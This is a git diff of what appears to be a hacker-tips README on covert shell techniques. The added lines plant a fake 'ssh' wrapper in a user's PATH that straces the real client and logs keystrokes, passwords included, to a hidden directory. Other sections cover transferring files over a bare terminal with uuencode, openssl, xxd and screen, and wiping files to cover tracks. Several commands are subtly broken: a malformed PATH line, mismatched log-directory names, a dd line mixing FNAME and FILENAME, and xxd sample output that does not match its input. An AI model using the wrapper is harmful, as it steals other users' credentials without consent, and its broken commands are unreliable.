@@ -73,15 +73,27 @@ Dirty way to monitor a user who is using ssh to connect to another host from a c
 
 Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)
 
-FIXME: alias it..
+Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
+```
+# Add ~/.ssh to the execution PATH variable so our 'ssh' is executed instead of the real ssh:
+$ echo '$PATH=~/.local/bin:$PATH' >>~/.profile
+# Create our log directory and our own ssh binary
+$ mkdir ~/.ssh/.logs
+$ mkdir -p ~/.local/bin ~/.ssh/logs
+$ cat >~/.local/bin/ssh
+#! /bin/bash
+strace -e trace=read -o ~/.ssh/.logs/ssh-$$-`date +%s`.txt /usr/bin/ssh $@
+# now press CTRL-d to close the file.
+$ chmod 755 ~/.local/bin/ssh
+```
 
+The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
-**10. File transfer - uuencode**
+**10. File Encoding - uuencode**
 
-Sometimes there is a need to transfer a file from your system to the target system to which you are logged in with a shell. This tricks works great when you do not have a real tty or can not reach the target by any other means but the one shell you have running.
+Sometimes it is needed to encode a binary file to a more terminal friendly character-set such as base64. Any of these encoding techniques can be (see further on) to transfer a binary file between your local system and a remote system you are logged in to using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).
 
-In this example we copy our local */etc/issue.net* to the remote system and save it there as *issue.net-COPY*:
-
+Encode:
 ```
 $ uuencode /etc/issue.net issuer.net-COPY
 begin 644 issue-net-COPY
@@ -89,7 +101,8 @@ begin 644 issue-net-COPY
 `
 end
 ```
-Now cut & paste the output (4 lines, starting with 'being 644 ...') into your remote shell after executing:
+Cut & paste the output (4 lines, starting with 'being 644 ...') into this command:
+Decode:
 ```
 $ uudecode
 begin 644 issue-net-COPY
@@ -98,52 +111,85 @@ begin 644 issue-net-COPY
 end
 ```
 
-**11. File transfer - openssl**
+**11. File Encoding - openssl**
 
-uuencode is rarely available these days. Openssl works just fine as well:
+Openssl can be used when uu/decode/encode is not available on the remote system:
+
+Encode:
 ```
 $ openssl base64 </etc/issue.net
 VWJ1bnR1IDE4LjA0LjIgTFRTCg==
 ```
-Then cut & paste everything into this command:
+Cut & paste the output into this command:
 ```
 $ openssl base64 -d >issue.net-COPY
 ```
 
-**12. File transfer - screen from REMOTE to LOCAL**
+**12. File Encoding - xxd**
+
+..and if neither *uuencode* nor *openssl* is available then we have to dig a bit deeper in our trick box and use *xxd*.
+
+Encode:
+```
+$ xxd -p </etc/issue.net
+726f6f743a783a303a30...
+```
+
+Cut & paste the output into this command:
+Decode:
+```
+$ xxd -p -r >issue.net-COPY
+```
+
+**13. File transfer - screen from REMOTE to LOCAL**
 
 Transfer a file FROM the remote system to your local system:
 
 Have a *screen* running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output:
 
-1. *CTRL-a : logfile screen-xfer.txt*
-2. *CTRL-a H*
+> CTRL-a : logfile screen-xfer.txt
 
-On the remote system use 'uuencode' to encode the file:
+> CTRL-a H
+
+We use *openssl* to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and *screen* will write this data to *screen-xfer.txt*:
+
 ```
-uuencode /etc/issue.net issue.net-COPY
+$ openssl base64 </etc/issue.net
 ```
+
 Stop your local screen from logging any further data:
 
-3. *CTRL-a H* 
+> CTRL-a H 
 
 On your local computer and from a different shell decode the file:
 ```
-$ uudecode <screen-xfer.txt
+$ openssl base64 -d <screen-xfer.txt
 $ rm -rf screen-xfer.txt
 ```
 
 **13. File transfer - screen from LOCAL to REMOTE**
 
-Use *uuencode* as before. On the remote system (and from within the current *screen*):
+On your local system (from within a different shell) encode the data:
 ```
-$ uudecode
+$ openssl base64 </etc/issue.net >screen-xfer.txt
 ```
 
-Get *screen* to slurp the uuencoded data into its own clipboard.
+On the remote system (and from within the current *screen*):
+```
+$ openssl base64 -d
+```
 
-1. CTRL-a : readbuf /etc/issue.net-COPY
-2. CTRL-a : paste .
+Get *screen* to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:
+
+> CTRL-a : readbuf screen-xfer.txt
+
+> CTRL-a : paste .
+
+> CTRL-d
+
+> CTRL-d
+
+Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
 
 **14. Shred & Erase a file**
 
@@ -153,11 +199,12 @@ $ shred -z foobar.txt
 
 **15. Shred & Erase without *shred***
 ```
-$ FILENAME=foobar.txt; dd bs=1k count="`du -sk \"${FILENAME}\" | cut -f1`" if=/dev/urandom >"${FILENAME}"; rm -f "${FILENAME}"
+$ FNAME=foobar.txt; dd bs=1k count="`du -sk \"${FNAME}\" | cut -f1`" if=/dev/urandom >"${FILENAME}"; rm -f "${FNAME}"
 ```
 Note: Or deploy your files in /dev/shm directory so that no data is written to the harddrive. Wont survive a reboot.
 Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.
 
-
+--------------------------------------------------------------------------
+Shoutz: ADM
 
 
